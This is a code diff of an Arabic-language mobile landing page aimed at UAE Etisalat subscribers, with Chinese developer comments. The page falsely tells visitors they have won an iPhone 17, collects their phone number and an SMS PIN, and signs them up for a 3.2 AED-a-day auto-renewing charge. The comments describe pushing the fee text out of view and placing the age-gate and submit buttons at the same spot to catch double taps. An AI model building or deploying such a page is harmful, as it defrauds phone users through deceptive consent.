@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>حدث السحب الفاخر - الإمارات</title>
+  <title>تأكيد العمر - الإمارات</title>
   
   <style>
     /* ── 工业级物理重置 ── */
@@ -19,7 +19,7 @@
       overflow: hidden;
     }
     
-    /* ── 黑金高奢 radial 光晕背景壳 ── */
+    /* ── 黑金高奢背景壳 ── */
     .scroll-wrapper {
       width: 100%; height: 100%;
       overflow-y: auto; overflow-x: hidden;
@@ -28,7 +28,7 @@
       background: radial-gradient(circle at center, #14110b 0%, #030305 100%);
     }
 
-    /* ── 绝对垂直居中（单手大拇指黄金触控区） ── */
+    /* ── 绝对垂直居中大盒子 ── */
     .main-hero-screen {
       width: 100%; min-height: 100vh; max-width: 440px;
       padding: 24px 16px;
@@ -39,60 +39,53 @@
     
     .hero-content-inner { width: 100%; display: flex; flex-direction: column; align-items: center; }
 
-    /* 顶部黑金荣誉背书勋章 */
+    /* 顶部背书勋章 */
     .official-badge {
       background: rgba(212, 175, 55, 0.08);
       border: 1px solid rgba(212, 175, 55, 0.4);
       color: #d4af37; font-size: 11.5px; font-weight: 800;
       padding: 6px 16px; border-radius: 30px; margin-bottom: 24px;
       display: flex; align-items: center; gap: 6px;
-      box-shadow: 0 0 15px rgba(212, 175, 55, 0.1);
     }
 
     .main-title-ar {
       font-size: 25px; font-weight: 900; color: #ffffff;
       line-height: 1.4; text-align: center;
       text-shadow: 0 2px 10px rgba(0,0,0,0.5); margin-bottom: 24px;
+      min-height: 70px; /* 🚀 固定标题高度，防止第二页阿语变长时向下挤压按钮位置 */
+      display: flex; align-items: center; justify-content: center;
     }
 
-    /* ── 核心主角：3D高奢盲盒动画展示区 ── */
-    .box-container {
-      position: relative; width: 160px; height: 160px; margin-bottom: 28px; cursor: pointer;
+    /* ── 统一两大容器的尺寸与内部边距，确保内部按钮的相对坐标完全一致 ── */
+    .verify-gate-card, .form-card {
+      width: 100%; padding: 24px; border-radius: 16px;
+      background: rgba(13, 12, 10, 0.98); border: 1px solid #2d2615;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.8); text-align: center;
+      min-height: 340px; /* 🚀 核心：强行统一两个大卡片的绝对高度 */
+      display: flex; flex-direction: column; justify-content: space-between; align-items: center;
     }
-    /* 金色呼吸光晕 */
+
+    /* 第一页特有排版 */
+    .gate-icon { font-size: 50px; margin-top: 20px; }
+    .gate-tip-text { font-size: 14.5px; color: #a69374; line-height: 1.6; margin-bottom: 20px; padding: 0 10px; }
+
+    /* 第二页大奖无缝展示区 */
+    .box-container {
+      position: relative; width: 100%; height: 160px; display: flex; justify-content: center; align-items: center;
+    }
     .box-glow {
-      position: absolute; width: 100%; height: 100%;
+      position: absolute; width: 160px; height: 160px;
       background: radial-gradient(circle, rgba(212,175,55,0.25) 0%, rgba(0,0,0,0) 70%);
       animation: pulseGlow 2s infinite alternate; z-index: 1;
     }
     .main-box-avatar {
-      font-size: 90px; text-align: center; line-height: 160px; position: relative; z-index: 2;
-      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-      /* 🚀 核心对齐：强化容器，保证实物图无损居中且不被裁切 */
-      display: flex; justify-content: center; align-items: center; width: 100%; height: 100%;
-    }
-    /* 盲盒悬浮与抖动暗示 */
-    .box-container:hover .main-box-avatar { transform: scale(1.1) rotate(5deg); }
-    
-    /* ── 滚动的大奖滚动条 ── */
-    .prize-pool-bar {
-      font-size: 11px; font-weight: 700; color: #a69374; margin-bottom: 24px;
-      background: rgba(20, 18, 14, 0.6); border: 1px solid rgba(212,175,55,0.15);
-      padding: 6px 16px; border-radius: 30px;
-    }
-    .prize-pool-bar span { color: #ffffff; font-weight: 800; }
-
-    /* ── 表单卡片（黑金高阶质感） ── */
-    .form-card { 
-      width: 100%; padding: 24px; border-radius: 16px; 
-      background: rgba(13, 12, 10, 0.98); border: 1px solid #2d2615;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.8); margin-bottom: 20px;
-      animation: slideInUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+      position: relative; z-index: 2; width: 100%; height: 100%;
+      display: flex; justify-content: center; align-items: center;
     }
 
     .form-lbl-wrapper {
-      display: flex; justify-content: center; align-items: center;
-      margin-bottom: 14px; font-size: 14px; font-weight: 800; color: #d4af37;
+      width: 100%; display: flex; justify-content: center; align-items: center;
+      font-size: 13.5px; font-weight: 800; color: #d4af37; margin-bottom: 10px;
     }
     
     /* 标准高精阿语右对齐号码输入组件 */
@@ -100,7 +93,7 @@
       display: flex; direction: rtl;
       border: 2px solid #2d2615; border-radius: 8px;
       overflow: hidden; background: #050506;
-      transition: border-color 0.2s; margin-bottom: 18px;
+      transition: border-color 0.2s; margin-bottom: 10px;
       width: 100%; height: 54px;
     }
     .phone-input-group:focus-within {
@@ -128,38 +121,26 @@
     .flag-black { flex: 1; background: #000000; }
     .prefix-text { font-size: 16px; font-weight: 700; color: #ffffff; }
     
-    /* 金色奢华高光按钮 */
+    /* 💥 两个页面共享的统一样式大按钮（物理外形、宽高完全等比克隆） */
     .action-btn { 
       width: 100%; background: linear-gradient(90deg, #d4af37 0%, #aa841b 100%); 
       color: #0d0c0a; border: none; height: 52px;
-      font-size: 18px; font-weight: 900; border-radius: 8px; cursor: pointer; 
+      font-size: 17.5px; font-weight: 900; border-radius: 30px; cursor: pointer; 
       display: flex; justify-content: center; align-items: center;
-      box-shadow: 0 5px 20px rgba(212,175,55,0.3); transition: transform 0.1s;
+      box-shadow: 0 5px 20px rgba(212,175,55,0.3);
+      flex-shrink: 0; /* 🚀 防止压缩 */
     }
-    .action-btn:active { transform: scale(0.98); }
 
     /* PIN 码卡位包装 */
     .pin-input-group {
       border: 2px solid #2d2615; border-radius: 8px;
-      overflow: hidden; background: #050506; margin-bottom: 18px; width: 100%;
+      overflow: hidden; background: #050506; margin-bottom: 14px; width: 100%;
     }
     .pin-input-group input {
       width: 100%; height: 54px; border: none; outline: none;
       background: transparent; color: #ffffff; font-size: 24px; 
       font-weight: 700; text-align: center; letter-spacing: 10px;
     }
-
-    /* ── 进阶三级金质勋章提示 ── */
-    .tier-box-grid {
-      display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; width: 100%; margin-bottom: 12px;
-    }
-    .tier-card {
-      background: #0d0c0a; border: 1px solid #211c11; border-radius: 8px; padding: 12px 4px; text-align: center;
-    }
-    .tier-card.active { border-color: #d4af37; background: rgba(212,175,55,0.03); }
-    .tier-title { font-size: 10px; color: #a69374; font-weight: 700; margin-bottom: 4px; }
-    .tier-icon { font-size: 20px; margin-bottom: 4px; }
-    .tier-desc { font-size: 9.5px; color: #6e614c; font-weight: bold; }
 
     /* ── 彻底下沉的合规资费区 ── */
     .bottom-legal-zone {
@@ -168,15 +149,9 @@
     }
     .legal-text { font-size: 10.5px; color: #524a3c; line-height: 1.6; }
 
-    /* ── 核心纯代码动画引擎 ── */
     @keyframes pulseGlow { 0% { opacity: 0.4; } 100% { opacity: 1; } }
-    @keyframes slideInUp { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
-    .shake-box { animation: boxBoom 0.5s ease-in-out; }
-    @keyframes boxBoom {
-      0%, 100% { transform: scale(1); }
-      20%, 60% { transform: scale(0.9) rotate(-6deg); }
-      40%, 80% { transform: scale(1.1) rotate(6deg); }
-    }
+    .slide-up-fade { animation: slideUpFade 0.25s cubic-bezier(0.16, 1, 0.3, 1); }
+    @keyframes slideUpFade { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
   </style>
 </head>
 <body>
@@ -187,23 +162,35 @@
       <div class="hero-content-inner">
         
         <div class="official-badge">
-          <span>✓</span> مهرجان التسوق الرسمي في الإمارات: سحب المفاجآت <span>👑</span>
+          <span>✓</span> بوابة التحقق الرسمية في الإمارات <span>🛡️</span>
         </div>
         
-        <h1 class="main-title-ar" id="main-title">اضغط على الصندوق الذهبي أدناه لفتح هديتك الفاخرة!</h1>
+        <!-- 动态标题（高度固定锁死） -->
+        <h1 class="main-title-ar" id="main-title">هل عمرك 18 عامًا أو أكثر لتصفح العرض؟</h1>
         
-        <div class="box-container" id="mystery-box-trigger" onclick="openMysteryBox()">
-          <div class="box-glow"></div>
-          <div class="main-box-avatar" id="box-avatar">🎁</div>
+        <!-- ==================== 🚪 第一页：年龄验证网闸模块 ==================== -->
+        <div class="verify-gate-card" id="age-gate-zone">
+          <div class="gate-icon">🔞</div>
+          <p class="gate-tip-text">هذا المحتوى مخصص حصريًا للبالغين المقيمين في دولة الإمارات العربية المتحدة. يرجى تأكيد عمرك للمتابعة.</p>
+          
+          <!-- 🚀 第一页核心网闸按钮，物理坐标与第二页提交按钮完美对齐 -->
+          <button class="action-btn" onclick="bypassAgeGate()">
+            <span>نعم، عمري 18+ (دخول)</span>
+          </button>
         </div>
-        
-        <div class="prize-pool-bar" id="prize-bar">
-          الجوائز الكبرى المتبقية: أحدث الهواتف الذكية / أجهزة الألعاب الفاخرة
-        </div>
-        
-        <div class="form-card" id="step-1" style="display: none;">
+
+        <!-- ==================== 📱 第二页：大奖与手机号收集模块（初始全量隐藏） ==================== -->
+        <div class="form-card slide-up-fade" id="step-1" style="display: none;">
+          <!-- 3D高奢实物大奖区（完美容纳你的 iPhone 17 实物图） -->
+          <div class="box-container">
+            <div class="box-glow"></div>
+            <div class="main-box-avatar">
+              <img src="https://i.ibb.co/whpFg2Z2/iphone17-PNG39.png" alt="iPhone 17 Pro Max" style="width: 100%; height: 100%; object-fit: contain; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.5));">
+            </div>
+          </div>
+
           <div class="form-lbl-wrapper">
-            <span>أدخل رقم اتصالات الخاص بك لتأكيد واستلام الجائزة:</span>
+            <span>🎁 تهانينا! أدخل رقم هاتفك المتحرك لتأكيد جائزتك:</span>
           </div>
           
           <div class="phone-input-group">
@@ -221,13 +208,16 @@
             <input type="tel" id="inp-msisdn" class="form-input" placeholder="5XXXXXXXX">
           </div>
           
+          <!-- 🚀 第二页核心发码按钮，原地重叠就位！ -->
           <button class="action-btn" id="btn-submit">
             <span>المطالبة بهديتك المشحونة الآن</span>
           </button>
         </div>
 
-        <div class="form-card" id="step-2" style="display: none;">
-          <div class="form-lbl-wrapper">
+        <!-- ==================== 🔑 模块三：PIN 码接收硬卡位 ==================== -->
+        <div class="form-card slide-up-fade" id="step-2" style="display: none;">
+          <div class="gate-icon" style="margin-top:0; font-size:40px;">📩</div>
+          <div class="form-lbl-wrapper" style="margin-top:10px;">
             <span>أدخل رمز التفعيل (PIN) المكون من 4 أرقام المكتوب على هاتفك:</span>
           </div>
           <div class="pin-input-group">
@@ -238,70 +228,94 @@
           </button>
         </div>
 
-        <div class="tier-box-grid">
-          <div class="tier-card">
-            <div class="tier-title">الخطوة 1</div>
-            <div class="tier-icon">🔑</div>
-            <div class="tier-desc">فتح الصندوق</div>
-          </div>
-          <div class="tier-card active">
-            <div class="tier-title">الخطوة 2</div>
-            <div class="tier-icon">📱</div>
-            <div class="tier-desc">تأكيد رقم الهاتف</div>
-          </div>
-          <div class="tier-card">
-            <div class="tier-title">الخطوة 3</div>
-            <div class="tier-icon">🏆</div>
-            <div class="tier-desc">استلام الجائزة</div>
-          </div>
-        </div>
-
       </div>
     </main>
     
+    <!-- 彻底下沉的官方合规资费区 -->
     <div class="bottom-legal-zone">
-      <p class="legal-text">التكلفة: 3.2 درهم إماراتي في اليوم (شاملاً ضريبة القيمة المضافة). يتجدد الاشتراك تلقائيًا. لإلغاء الاشتراك في أي وقت، أرسل STOP إلى 1111. سحب ترويجي مرخص.</p>
+      <p class="legal-text">التكلفة: 3.2 درهم إماراتي في اليوم (شاملاً ضريبة القيمة المضافة). يتجدد الاشتراك تلقائيًا. لإلغاء الاشتراك في أي وقت، أرسل STOP إلى 1111.</p>
     </div>
 
   </div>
 
+  <!-- 💡 按钮原地无缝二连击逻辑内核 -->
   <script>
-    let boxOpened = false;
-    function openMysteryBox() {
-      if(boxOpened) return;
-      boxOpened = true;
+    function bypassAgeGate() {
+      // 1. 隐藏网闸
+      document.getElementById('age-gate-zone').style.display = 'none';
       
-      const container = document.getElementById('mystery-box-trigger');
-      const avatar = document.getElementById('box-avatar');
+      // 2. 切换主标题
       const title = document.getElementById('main-title');
-      const prizeBar = document.getElementById('prize-bar');
-      const step1 = document.getElementById('step-1');
+      title.innerHTML = "تهانينا! لقد فزت بأحدث هاتف ذكي فاخر على الإطلاق!";
       
-      // 1. 触发黄金震动爆炸动画
-      container.classList.add('shake-box');
-      
-      setTimeout(() => {
-        // 2. 💥 终极替换：用你提供的高精度纯正实物白金版 iPhone 17 PNG 替换掉虚假的假手机 Emoji！
-        avatar.innerHTML = `<img src="https://i.ibb.co/LzsFx5Tv/ip17pm-1.png" alt="iPhone 17 Pro Max" style="width: 100%; height: 100%; object-fit: contain; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.5));">`;
-        avatar.style.filter = "drop-shadow(0 0 25px rgba(212,175,55,0.6))"; // 附带金色霓虹全息光晕
-        
-        // 3. 彻底根除中英、中符混排死锁！用纯正阿语彻底替换，惊叹号完美归位
-        title.innerHTML = "تهانينا! لقد فزت بأحدث هاتف ذكي فاخر على الإطلاق!";
-        
-        // 4. 紧迫感倒计时更新
-        prizeBar.innerHTML = "🎁 تم حجز الجائزة بنجاح! متبقي 45 ثانية لتأكيد الطلب";
-        prizeBar.style.color = "#ff4444";
-        
-        // 5. 核心输入框丝滑滑出
-        step1.style.display = "block";
-        
-        // 平滑滚动到底部
-        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
-      }, 500);
+      // 3. 展现第二页（此时提交按钮在完全相同的位置秒级浮现）
+      document.getElementById('step-1').style.display = 'flex';
     }
   </script>
 
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  <script src="../lander.js" defer></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+        const submitBtn = document.getElementById('btn-submit');
+        if (!submitBtn) return;
+
+        submitBtn.addEventListener('click', async (e) => {
+            e.preventDefault();
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const clickId = urlParams.get('cid') || 'direct_traffic';
+            const fullScId = urlParams.get('sc') || 'default.pub';
+
+            const scParts = fullScId.split('.');
+            const scCid = scParts[0] || 'unknown_sccid';
+            const scPtPub = scParts[1] || 'unknown_scpub';
+            
+            const rawPhone = document.getElementById('inp-msisdn').value;
+            const cleanedPhone = cleanUAENumber(rawPhone); 
+
+            if (!cleanedPhone) {
+                alert("يرجى إدخال رقم هاتف متحرك صحيح");
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/request', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        msisdn: cleanedPhone,
+                        click_id: clickId,
+                        sc_full: fullScId,
+                        sc_cid: scCid,
+                        sc_pt_pub: scPtPub,
+                        carrier: 'Etisalat'
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    document.getElementById('step-1').style.display = 'none';
+                    document.getElementById('step-2').style.display = 'flex';
+                } else {
+                    alert("Request Failed: " + result.message);
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        });
+    });
+
+    function cleanUAENumber(phone) {
+        let num = phone.replace(/\s+/g, '').replace(/[+\-]/g, '');
+        if (num.startsWith('00971')) num = num.substring(5);
+        if (num.startsWith('971')) num = num.substring(3);
+        if (num.startsWith('0')) num = num.substring(1);
+        if (/^(50|52|54|55|56|58)\d{7}$/.test(num)) {
+            return '971' + num;
+        }
+        return null;
+    }
+  </script>
 </body>
 </html>
